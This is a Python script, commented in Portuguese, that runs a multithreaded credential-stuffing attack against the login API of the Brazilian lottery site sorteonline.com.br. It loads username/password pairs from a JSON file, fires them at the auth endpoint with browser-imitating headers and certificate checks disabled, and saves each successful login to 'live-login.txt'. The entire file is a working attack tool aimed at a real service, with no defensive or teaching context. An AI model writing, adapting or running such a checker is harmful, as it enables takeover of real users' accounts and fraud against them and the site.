import json
import requests
import threading
import urllib3

# Desabilitar os avisos de verificação de certificado SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def api(usuario, senha, headers):

    credenciais = f'{usuario}:{senha}'
    # Defina os diferentes conjuntos de dados
    dados = [
        {'email': usuario, 'password': senha}
    ]
    for data in dados:
        try:
            response = requests.post('https://ms.sorteonline.com.br/bff-connector/v1/auth/login', headers=headers, json=data, verify=False)
            obj = response.json()
            if response.status_code == 401:
                erro = obj['message']
                retorno = f'{credenciais} - {erro}'
                print(retorno)
            elif response.status_code == 200:
                retorno = f'{credenciais} - {response.text}'
                print(retorno)
                with open("live-login.txt", "a+") as arquivo:
                    arquivo.write(retorno + '\n')
        except:
            
            print("Problema na request: "+credenciais)

# Função para processar um quarto dos dados em uma thread
def processar_quarto(dados, headers):
    for item in dados:
        api(item["username"], item["password"], headers)

with open('dados.json') as f:
    data = json.load(f)

# Divida o conjunto de dados em 4 partes iguais
tamanho_quarto = len(data) // 4
quarto1 = data[:tamanho_quarto]
quarto2 = data[tamanho_quarto:2*tamanho_quarto]
quarto3 = data[2*tamanho_quarto:3*tamanho_quarto]
quarto4 = data[3*tamanho_quarto:]

# Cabeçalhos comuns para todas as solicitações
headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'client_id': 'd71d4a24-9410-4ad2-a728-bc9c52b52c43',
    'content-type': 'application/json',
    'origin': 'https://www.sorteonline.com.br',
    'priority': 'u=1, i',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
}

# Crie e inicie as threads
thread1 = threading.Thread(target=processar_quarto, args=(quarto1, headers))
thread2 = threading.Thread(target=processar_quarto, args=(quarto2, headers))
thread3 = threading.Thread(target=processar_quarto, args=(quarto3, headers))
thread4 = threading.Thread(target=processar_quarto, args=(quarto4, headers))

thread1.start()
thread2.start()
thread3.start()
thread4.start()

# Espere até que todas as threads terminem
thread1.join()
thread2.join()
thread3.join()
thread4.join()
